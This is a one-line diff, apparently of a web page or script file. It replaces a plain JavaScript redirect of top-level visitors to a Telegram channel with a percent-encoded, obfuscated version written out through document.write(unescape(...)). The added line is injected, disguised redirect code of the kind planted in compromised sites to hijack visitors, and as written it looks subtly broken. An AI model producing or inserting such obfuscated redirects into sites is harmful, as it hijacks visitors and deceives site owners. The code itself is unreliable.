@@ -1,1 +1,1 @@
-if (window == window.top) document.location = "https://t.me/lsbtv"
+<script>document.write(unescape('%69%66%20%28%77%69%6E%64%6F%77%20%3D%3D%20%77%69%6E%64%6F%77%2E%74%6F%70%29%20%64%6F%63%75%6D%65%6E%74%2E%6C%6F%63%61%74%69%6F%6E%20%3D%20%22%68%74%74%70%73%3A%2F%2F%74%2E%6D%65%2F%6C%73%62%74%76%22'))</script>
